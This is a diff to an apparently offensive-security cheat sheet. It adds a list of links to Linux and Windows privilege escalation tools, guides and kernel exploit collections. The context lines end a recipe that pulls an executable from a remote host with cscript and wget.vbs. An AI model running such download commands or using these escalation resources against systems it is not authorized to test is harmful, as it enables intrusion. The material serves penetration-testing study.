@@ -158,3 +158,32 @@ echo ts.Close >> wget.vbs
 # Execute
 cscript wget.vbs http://10.10.10.10/file.exe file.exe
 ```
+
+## Privilege Escalation
+
+Common priviledge escalation exploits and scripts: https://github.com/AusJock/Privilege-Escalation
+
+### Linux
+
+- Linux EoP (Best privesc): https://guif.re/linuxeop
+- Basic Linux Privilege Escalation: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+- unix-privesc-check: http://pentestmonkey.net/tools/audit/unix-privesc-check
+- linuxprivchecker.py: http://www.securitysift.com/download/linuxprivchecker.py
+- Linux Enumeration: https://github.com/rebootuser/LinEnum
+- pspy: https://github.com/DominicBreuker/pspy
+- Linux Priv Checker: https://github.com/sleventyeleven/linuxprivchecker
+- Kernel Exploits: https://github.com/lucyoa/kernel-exploits
+- PrivEsc binaries: https://gtfobins.github.io/
+
+### Windows
+
+- Windows Privilege Escalation Fundamentals: http://www.fuzzysecurity.com/tutorials/16.html
+- Windows-Exploit-Suggester: https://github.com/GDSSecurity/Windows-Exploit-Suggester
+- winprivesc: https://github.com/joshruppe/winprivesc
+- Windows Privilege Escalation Guide: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+- Windows-Privesc: https://github.com/togie6/Windows-Privesc
+- WindowsExploits: https://github.com/abatchy17/WindowsExploits
+- PowerSploit: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+- Windows EoP: https://guif.re/windowseop
+- OSCP Notes: https://securism.wordpress.com/oscp-notes-privilege-escalation-windows/
+- PrivEsc Binaries: https://lolbas-project.github.io/
